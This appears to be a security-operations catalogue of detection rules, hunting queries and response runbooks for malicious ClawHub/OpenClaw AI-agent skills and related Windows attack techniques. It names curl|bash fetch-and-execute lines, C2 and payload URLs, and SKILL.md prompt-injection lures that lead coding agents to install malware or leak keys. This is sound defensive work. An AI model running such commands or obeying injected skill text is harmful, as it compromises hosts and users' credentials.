 | where RemoteUrl has "setup-service.com" or RemoteUrl endswith ".setup-service.com"

title: DNS Query or Network Connection to setup-service.com (OpenClaw ClawHub C2)
id: a1f2b3c4-d5e6-4789-9abc-1de2f3a4b5c6
status: experimental
description: Detects DNS resolution or outbound connection to setup-service.com, the C2 hosting the second-stage stager script for the malicious OpenClaw ClawHub skill (google-qx4 / NET_NiNjA) reported by Snyk in Feb 2026.
references:
  - https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/
author: SOC Detection Engineering
date: 2026/02/10
tags:
  - attack.command_and_control
  - attack.t1071.001
  - attack.t1105
logsource:
  category: dns
  product: windows
detection:
  selection:
    QueryName|contains: 'setup-service.com'
  condition: selection
falsepositives:
  - None expected; domain has no benign reputation.
level: high
(source:windows.sysmon @EventID:22 @QueryName:*setup-service.com*) OR (source:windows.sysmon @EventID:3 (@DestinationHostname:*setup-service.com* OR @DestinationHostname:*SETUP-SERVICE.COM*)) OR (source:linux.auditd @process.command_line:(*setup-service.com* OR *SETUP-SERVICE.COM*))
(#event_simpleName=DnsRequest DomainName=/setup-service\.com$/i)
OR (#event_simpleName=NetworkConnectIP4 RemoteAddressIP4=* | join({#event_simpleName=DnsRequest DomainName=/setup-service\.com$/i | rename(IpAddress, as=RemoteAddressIP4)}, field=RemoteAddressIP4))
| groupBy([aid, ComputerName, ContextImageFileName, DomainName], function=count())

Pastebin-piping stager retrieved from rentry.co/openclaw-core (macOS/Linux ClawHub skill) AIDelivery High
Hunts endpoints fetching the rentry.co/openclaw-core page or piping it into a shell (curl|bash, wget|sh, osascript). The article documents this exact pastebin-piping pattern as the macOS/Linux delivery vector for the OpenClaw malicious skill. Detection is article-specific because of the unique rentry slug. Rationale: The Snyk article literally embeds the rentry.co/openclaw-core URL as the macOS/Linux delivery slug for the malicious skill, and explicitly describes the pastebin-piping technique (rentry page → curl|bash). The detection pairs the unique URL slug with a shell/downloader child process, eliminating the noise of someone merely opening the page in a browser. Cross-checked against: • https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/
ATT&CKT1105 T1059.004 T1059.001 T1204.002
Data sourcesWeb.Web Endpoint.Processes Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher detonating the sample in a corporate lab
  • Threat intel analyst clicking the IOC link from the article via a managed browser
  • Snyk Evo / mcp-scan signature verification fetching the URL for comparison
  • Web proxy DLP that fetches the URL to classify it
  • Developer benignly inspecting rentry.co pages for an unrelated agent skill
Suppression filter
| where not(User in~ ("redteam-lab","threat-intel") or DeviceName has_any ("sandbox-","dlp-fetcher-","snyk-evo-"))
Response runbook
Step 1 — Triage: confirm a downloader/shell process actually piped the content (curl/wget/osascript followed by bash/sh/zsh, or PowerShell IEX with the rentry URL). A browser-only fetch is informational; a shell pipe is confirmed execution. Identify the user and check whether the OpenClaw / Clawdbot agent was running. Step 2 — Contain: isolate the host, terminate the shell tree, snapshot ~/.bash_history, /tmp, AppData\Roaming, ~/Library/LaunchAgents, and the OpenClaw skill directory. Revoke any Google OAuth / agent credentials the user held. Step 3 — Hunt: pivot on the device + user for outbound to setup-service.com and for any SKILL.md files referencing 'openclaw-core', 'google-qx4', 'NET_NiNjA', or the denboss99 / aztr0nutz GitHub orgs.

Download of openclawcore-1.0.3.zip from denboss99 GitHub release (Windows OpenClaw skill payload) AIDelivery High
Hunts the specific GitHub release URL pointing to the password-protected ZIP (openclawcore-1.0.3.zip, password 'openclaw') delivered to Windows ClawHub users by the malicious google-qx4 / NET_NiNjA skills. The repo path is article-specific and has zero legitimate corporate use. Rationale: The article cites the exact URL github.com/denboss99/openclaw-core/releases/download/v3/openclawcore-1.0.3.zip and the password 'openclaw' as the Windows delivery; aztr0nutz/NET_NINJA.v1.2 is the second-skill GitHub IOC from the pre-extracted list. Both the GitHub repo path and the precise ZIP filename are unique enough to alert without throttling. Cross-checked against: • https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/

SKILL.md file written referencing fabricated openclaw-core prerequisite (ClawHub skill social engineering hook) AIWeaponization Medium
Hunts SKILL.md files written or modified on an endpoint where the body references the fictitious openclaw-core utility, rentry.co/openclaw-core, or the denboss99/aztr0nutz GitHub orgs. This is the article-specific prompt-injection payload — distinguishing this attack from generic SKILL.md authoring. Rationale: The article identifies SKILL.md as the prompt-injection delivery vehicle and names six article-specific strings (openclaw-core, rentry.co/openclaw-core, denboss99/openclaw-core, aztr0nutz/NET_NINJA, google-qx4, NET_NiNjA). Pairing a SKILL.md write with the surrounding shell context limits this to the OpenClaw campaign rather than every legitimate AI agent skill authoring event. Cross-checked against: • https://snyk.io/blog/clawhub-malicious-google-skill-openclaw-malware/
ATT&CKT1195.001 T1204.002 T1059.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer legitimately authoring a Google integration SKILL.md and citing the Snyk IOC list inline as documentation
  • Snyk mcp-scan generating test fixtures for its own detection rules
  • DFIR responder copying the malicious SKILL.md into a case folder for evidence
  • Security training repos that include sanitized SKILL.md examples
  • Internal CTF / purple-team exercise that re-stages the lure
Suppression filter
| where not(FolderPath has_any ("\\mcp-scan\\fixtures\\","\\snyk-evo\\tests\\","\\threatintel\\","\\CTF\\") or User in~ ("threatintel","redteam-lab","dfir-bench"))
Response runbook
Step 1 — Triage: read the SKILL.md file contents from the endpoint (or pull via Live Response). Confirm it contains the openclaw-core 'Prerequisites' block + a rentry.co or denboss99 URL. Identify the user and which OpenClaw / Clawdbot agent installed the skill. Step 2 — Contain: isolate the host, remove the SKILL.md from the skill registry, kill any shell/curl/powershell process the user launched to satisfy the prerequisite, and revoke Google OAuth tokens issued during the agent session. Step 3 — Hunt: pivot on the device + user for connections to setup-service.com and rentry.co/openclaw-core, file writes of openclawcore-1.0.3.zip, and look for similar SKILL.md files anywhere else in the org's ClawHub skill cache or developer workstations.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "SKILL.md"
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| project Timestamp, DeviceName, User=InitiatingProcessAccountName, FolderPath, FileName, SHA256, FileOriginUrl, Tool=InitiatingProcessFileName, Cmd=InitiatingProcessCommandLine
| join kind=inner (
    DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where ProcessCommandLine has_any ("openclaw-core","rentry.co/openclaw-core","denboss99/openclaw-core","aztr0nutz/NET_NINJA","google-qx4","NET_NiNjA")
    | project DeviceName, User=AccountName, ContextCmd=ProcessCommandLine, ContextTime=Timestamp
) on DeviceName, User
| where abs(datetime_diff('second', Timestamp, ContextTime)) <= 600
| project Timestamp, DeviceName, User, FolderPath, FileName, Tool, Cmd, ContextCmd, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "SKILL.md"
| where EventType in ("FileCreated","FileModified","FileRenamed","FileCreate","FileModify")
| project TimeGenerated, Host=DvcHostname, User=ActorUsername, FilePath=TargetFilePath, FileName=TargetFileName, SHA256=TargetFileSHA256, Process=ActingProcessName, Cmd=ActingProcessCommandLine
| join kind=inner (
    ImProcessCreate
    | where TimeGenerated > ago(30d)
    | where ActingProcessCommandLine has_any ("openclaw-core","rentry.co/openclaw-core","denboss99/openclaw-core","aztr0nutz/NET_NINJA","google-qx4","NET_NiNjA")
    | project Host=DvcHostname, User=ActorUsername, ContextCmd=ActingProcessCommandLine, ContextTime=TimeGenerated
) on Host, User
| where abs(datetime_diff('second', TimeGenerated, ContextTime)) <= 600
| project TimeGenerated, Host, User, FilePath, FileName, Process, Cmd, ContextCmd, SHA256
| order by TimeGenerated desc
(source:windows.sysmon @EventID:11 @TargetFilename:(*\\SKILL.md OR *\\skill.md)) OR (source:linux.auditd @auditd.type:PATH @file.path:(*/SKILL.md OR */skill.md)) OR (source:windows.sysmon @EventID:1 @CommandLine:(*openclaw-core* OR *rentry.co/openclaw-core* OR *denboss99/openclaw-core* OR *aztr0nutz/NET_NINJA* OR *google-qx4* OR *NET_NiNjA*))

| groupBy([aid, ComputerName, UserName, TargetFileName, CommandLine], function=count())

OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)
| where ActionType in ("Consent to application.","Add OAuth2PermissionGrant.","Add delegated permission grant.")
| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,
          ActivityObjects, IPAddress, UserAgent
// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),
         AppId   = tostring(parse_json(tostring(TargetResources))[0].id),
         User    = tostring(parse_json(tostring(InitiatedBy)).user.userPrincipalName)
| project TimeGenerated, OperationName, User, AppName, AppId, Result
| order by TimeGenerated desc

title: Scheduled Task Creation with Suspicious Image / Encoded Args
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0d
status: experimental
description: |
    schtasks.exe /create with payload-shaped action — points at
    powershell, cmd, rundll32, encoded-base64, or user-writable paths.
references:
    - https://attack.mitre.org/techniques/T1053/005/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1053.005
    - attack.persistence
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_schtasks:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains: '/create'
    selection_payload:
        CommandLine|contains:
            - 'powershell'
            - 'cmd.exe'
            - 'rundll32'
            - '-enc'
            - 'FromBase64'
            - '\Users\Public'
            - '\AppData\'
    condition: selection_schtasks and selection_payload
falsepositives:
    - GPO-driven scheduled tasks, MDT/SCCM imaging
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name="schtasks.exe" AND Processes.process="*/create*"
      AND (Processes.process="*powershell*" OR Processes.process="*cmd.exe*"
        OR Processes.process="*rundll32*" OR Processes.process="*-enc*"
        OR Processes.process="*FromBase64*" OR Processes.process="*\Users\Public*"
        OR Processes.process="*\AppData\*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name="schtasks.exe" AND Processes.process="*/create*"
      AND (Processes.process="*powershell*" OR Processes.process="*cmd.exe*"
        OR Processes.process="*rundll32*" OR Processes.process="*-enc*"
        OR Processes.process="*FromBase64*" OR Processes.process="*\Users\Public*"
        OR Processes.process="*\AppData\*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

CISA KEV: CVE-2026-21513 — Microsoft MSHTML Framework Protection Mechanism Failure Vulnerability

CISA KEV
2026-02-10 1 use case 0 techniques 2 kill-chain phases detected

Microsoft MSHTML Framework contains a protection mechanism failure vulnerability that could allow an unauthorized attacker to bypass a security feature over a network. Vendor: Microsoft, Product: Windows. Federal patch due: 2026-03-03.

CVEsCVE-2026-21513

Actions on Objectives
—
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-21513")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-21513")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

    from datamodel=Vulnerabilities
    where Vulnerabilities.signature IN ("CVE-2026-21513")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime

Installation of credential-leaking ClawHub skills (moltyverse-email, buy-anything, prompt-log, youtube-data) AIInstallation High
Detects installation of the four ClawHub marketplace skills Snyk specifically named as exposing API keys, PII and credit card data through LLM context windows. Anchored on the exact `clawhub install <skill>` invocations and the `npm install -g clawhub` bootstrap command from the article. Rationale: Anchors on the four skill names Snyk explicitly named (moltyverse-email, buy-anything, prompt-log, youtube-data) and the clawhub bootstrap command — none of these strings appear in legitimate non-AI-agent dev tooling, so FP rate is naturally low. No external sources required; article gives literal install commands.
ATT&CKT1195.002 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal security researcher running the same Snyk audit on a sandbox host
  • Blue-team analyst installing the skill in a contained lab to reproduce vulnerability
  • AI-platform team evaluating the ClawHub marketplace for an org-wide allow/deny policy
  • Developer legitimately testing an AI agent in a personal sandbox after the vuln is disclosed but before the skill is delisted
Suppression filter
| where InitiatingProcessParentFileName !in~ ("snyk-cli.exe","snyk.exe") and InitiatingProcessCommandLine !has "sandbox" and InitiatingProcessCommandLine !has "evo-agent-security-analyzer"
Response runbook
Step 1 (Triage): Confirm the installing user is in an authorized AI-platform / dev role. Capture the exact skill name from ProcessCommandLine and read the skill's SKILL.md from ~/.clawhub/skills/<skill>/SKILL.md to verify the insecure pattern. Step 2 (Contain): If unauthorized, run `clawhub uninstall <skill>` on the host, disable the user's AI-agent session, and rotate any credentials that may have been handed to the agent in that session (Stripe keys, moltyverse API keys, any sensitive env vars). Step 3 (Hunt): On the same host, search DeviceProcessEvents for the next 24h of curl calls referencing api.stripe.com/v1/tokens or moltyverse.email (UC2 logic), and search DeviceFileEvents for any .prompt-log/*.md exports (UC3 logic) that may already contain leaked secrets.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "clawhub"
| where ProcessCommandLine has_any ("clawhub install moltyverse-email","clawhub install buy-anything","clawhub install prompt-log","clawhub install youtube-data","npm install -g clawhub")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where CommandLine has "clawhub"
| where CommandLine has_any ("clawhub install moltyverse-email","clawhub install buy-anything","clawhub install prompt-log","clawhub install youtube-data","npm install -g clawhub")
| where AccountName !endswith "$"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

AI agent skill leaks Stripe key or card PAN/CVC verbatim in curl command line AIActions on Objectives High
Hunts the exact insecure pattern from buy-anything v2.0.0 and moltyverse-email v1.1.0: a curl/bash invocation that embeds a live Stripe publishable key (pk_live_*) or raw card number plus CVC into the command line for api.stripe.com/v1/tokens, or hits api.moltyverse.email / moltyverse.email/inbox with the API key in the request. These secrets flow through process audit logs, EDR cmd-line capture, and the LLM provider's conversation history. Rationale: Article verbatim shows the curl with `-u "pk_live_51LgDhr..." -d "card[number]=4242..." -d "card[cvc]=123"` against api.stripe.com/v1/tokens and references api.moltyverse.email in the skill metadata. The combination of a Stripe/moltyverse endpoint with raw card form-fields or live Stripe-key prefixes in a single process command line is article-specific and effectively never occurs in well-architected payment flows (real apps post tokens, not PANs).
ATT&CKT1552.001 T1071.001 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer testing a Stripe integration with the test PAN 4242424242424242 (Stripe documentation example)
  • Authorized SOC blue-team reproducing the Snyk PoC in a contained lab
  • Legacy server-side Stripe tokenization that still does direct PAN tokenization (technically a PCI finding regardless)
  • Snyk Evo Agent Security Analyzer or similar SAST tool scanning the SKILL.md file (would appear in static-analysis tooling cmdline, not as curl)
Suppression filter
| where ProcessCommandLine !has "4242424242424242" or ProcessCommandLine !has "test" | where InitiatingProcessFolderPath !has "\\stripe-cli\\" and InitiatingProcessCommandLine !has "--testmode"
Response runbook
Step 1 (Triage): Extract every secret in the captured ProcessCommandLine — Stripe key prefix (pk_live_*/sk_live_*), card PAN, CVC, exp, moltyverse `?key=` value. Note exact timestamp, host, user, parent process (likely bash/AI-agent runtime). Step 2 (Contain): Rotate the Stripe key immediately in the Stripe dashboard (Roll); revoke the moltyverse API key; freeze any cards captured (issuer contact); kill the AI-agent session; remove the buy-anything / moltyverse-email skill (`clawhub uninstall`). Step 3 (Hunt): Pull the agent's session .jsonl from ~/.codex/sessions, ~/.claude/projects, or ~/.clawdbot/agents/main/sessions and grep for the leaked values; pull LLM-provider audit logs (OpenAI / Anthropic) for any conversations carrying the same secrets; look for prompt-log .md exports (UC3) that already shared the cleartext into a markdown artifact.

| where AccountName !endswith "$"

AI session-log harvest via prompt-log extract.sh writing markdown with embedded secrets AIActions on Objectives Medium
Detects the ClawHub prompt-log skill's `scripts/extract.sh` reading `.jsonl` session transcripts from agent session directories (~/.codex/sessions, ~/.claude/projects, ~/.clawdbot/agents) and emitting a markdown transcript to `.prompt-log/`. As noted by Snyk, this step re-exposes any plaintext credentials handled in earlier agent interactions as a static, shareable artifact. Rationale: Article literally shows the prompt-log usage examples: `scripts/extract.sh ~/.codex/sessions/2026/01/12/abcdef.jsonl` and `scripts/extract.sh ~/.claude/projects/my-proj/xyz.jsonl --output my-transcript.md`, with default output `.prompt-log/YYYY-MM-DD-HHMMSS.md`. Combining the script name with any of the three session-directory patterns (or the .prompt-log output path) gives a high-fidelity, article-specific hit.
ATT&CKT1005 T1552.001 T1213
Data sourcesEndpoint.Processes Endpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate developer exporting their own session transcripts to share a bug repro with vendor support
  • Internal IR/forensics team triaging an AI agent incident by extracting session logs
  • Snyk Evo Agent Security Analyzer or other auditing tool walking session directories during a research scan
  • Developer using a similarly-named extract.sh for unrelated jq/jsonl batch processing
Suppression filter
| where InitiatingProcessCommandLine !has "--output" or InitiatingProcessCommandLine has_any ("--after","--before") | where InitiatingProcessParentFileName !in~ ("ir-toolkit.sh","forensics-collector.exe")
Response runbook
Step 1 (Triage): Locate the produced markdown (default `.prompt-log/YYYY-MM-DD-HHMMSS.md`). Read it and inventory any secrets it now contains in plaintext: Stripe keys, moltyverse API keys, card data, OAuth tokens, internal API tokens. Step 2 (Contain): Quarantine the markdown — delete from host and from any sync targets (OneDrive, Dropbox, iCloud, git working trees, Slack uploads, GitHub gists). Uninstall the prompt-log skill: `clawhub uninstall prompt-log`. Rotate every identified secret. Step 3 (Hunt): Search the org for any other `.prompt-log/*.md` files via DeviceFileEvents/auditd; check git history (git log --all -- '**/.prompt-log/**') for accidental commits; review DLP/CASB logs for outbound .md uploads from the host; pivot to UC1 to see if other vulnerable skills are installed.
let SessionAnchors = dynamic([".codex/sessions",".claude/projects",".clawdbot/agents",".jsonl",".prompt-log"]);
let ProcHits = DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has "extract.sh"
| where ProcessCommandLine has_any (SessionAnchors)
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine;
let FileHits = DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FolderPath has ".prompt-log" and FileName endswith ".md"
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, ProcessCommandLine=InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine;
ProcHits
| union FileHits
| order by Timestamp desc
Syslog
| where TimeGenerated > ago(7d)
| where SyslogMessage has "extract.sh"
| where SyslogMessage has_any (".codex/sessions",".claude/projects",".clawdbot/agents",".prompt-log",".jsonl")
| project TimeGenerated, Computer, ProcessName, SyslogMessage
| union (
    SecurityEvent
    | where TimeGenerated > ago(7d)
    | where EventID == 4688
    | where CommandLine has "extract.sh"
    | where CommandLine has_any (".codex/sessions",".claude/projects",".clawdbot/agents",".prompt-log",".jsonl")
    | where AccountName !endswith "$"
    | project TimeGenerated, Computer, ProcessName=NewProcessName, SyslogMessage=CommandLine
  )
| order by TimeGenerated desc

Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Study of Agent Skills Supply Chain Compromise

Snyk
2026-02-05 6 use cases 3 techniques 6 kill-chain phases detected

Snyk’s ToxicSkills research reveals 36% of AI agent skills contain security flaws, including 1,467 vulnerable skills and active malicious payloads targeting OpenClaw, Claude Code, and Cursor users.

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Dev endpoint contacts ClawHub / skills.sh agent-skill marketplace
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Snyk Finds Prompt Injection in 36%, 1467 Malicious Payloads in a ToxicSkills Stu
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] AI coding agent spawns remote fetch-and-execute (curl | bash / curl | source)
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] AI agent skill exfiltrates GitHub token / env secrets via dynamic-context shell-out
Dev endpoint contacts ClawHub / skills.sh agent-skill marketplace AIDelivery Medium
Surfaces developer workstations fetching Agent Skills from the ClawHub (clawhub.ai) and skills.sh / SkillsMP marketplaces named in the Snyk ToxicSkills audit. This is the supply-chain delivery step where 8 still-live malicious skills (Atomic Stealer droppers, credential thieves) are pulled onto a host running Claude Code, Cursor or OpenClaw. Rationale: Anchors on the two distribution domains named verbatim in the article (clawhub.ai, skills.sh) plus the SkillsMP marketplace corroborated by The Hacker News and Trend Micro; scoped to AI-agent and downloader processes to keep it host-relevant. Cross-checked against: • https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/ • https://www.trendmicro.com/en_us/research/26/b/openclaw-skills-used-to-distribute-atomic-macos-stealer.html • https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html
ATT&CKT1195.002 T1071.001
Data sourcesNetwork_Traffic.All_Traffic Endpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developer legitimately browsing or installing a vetted skill from ClawHub/skills.sh
  • Security researcher reproducing the ToxicSkills findings
  • CI runner pulling a pinned, internally-approved skill
  • Corporate web proxy pre-fetching/sandboxing the URL on a user's behalf
  • Marketing/blog traffic to snyk.io that 302-redirects through skills.sh
Response runbook
1) Triage: identify the host and user; confirm whether an AI coding agent (Claude Code/Cursor/OpenClaw) is installed and which skill ID was fetched — inspect ~/.claude/skills/ and project .claude/skills/ for a new SKILL.md. 2) Contain: if the skill is unknown/unapproved, isolate the workstation, quarantine the SKILL.md, and treat any credentials reachable from that host (gh tokens, ~/.aws, ~/.ssh) as exposed. 3) Hunt: pivot on the same host for UC2 (curl|bash from the agent) and UC3 (gh auth token / env-dump exfil) within the following hours; check outbound POSTs to non-marketplace domains.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any ("clawhub.ai","skills.sh","skillsmp")
| where InitiatingProcessFileName in~ ("node","node.exe","claude","claude.exe","cursor","cursor.exe","openclaw","openclaw.exe","curl","curl.exe","wget","powershell.exe","pwsh")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
DnsEvents
| where TimeGenerated > ago(30d)
| where Name has_any ("clawhub.ai","skills.sh","skillsmp")
| project TimeGenerated, Computer, ClientIP, Name, QueryType, ResultCode
| order by TimeGenerated desc

AI coding agent spawns remote fetch-and-execute (curl | bash / curl | source) AIInstallation High
Detects an AI coding agent process (Claude Code/node, Cursor, OpenClaw) spawning a shell that pipes a remote download straight into an interpreter — the 'unverifiable dependencies' / dynamic runtime-fetch behaviour Snyk found in 2.9% of ClawHub skills and 21% of confirmed-malicious samples (e.g. `curl https://remote/instructions.md | source`). Lets benign-at-review skills mutate behaviour post-publish. Rationale: Pairs the AI-agent parent process (the article's affected products) with the curl|bash / curl|source remote-execute primitive that corroborating Datadog and Snyk reporting cite as the dynamic-context attack; parent+behaviour pairing keeps it high-fidelity rather than a bare curl alert. Cross-checked against: • https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/ • https://securitylabs.datadoghq.com/articles/malicious-skills-supply-chain-risks-in-coding-agents-with-dynamic-context/ • https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html
ATT&CKT1059.004 T1059.001 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A legitimate skill bootstrapping a toolchain via the well-known `curl … | bash` installers (rustup.rs, get.docker.com, nvm, Homebrew)
  • Developer manually running an install one-liner inside the agent's integrated terminal
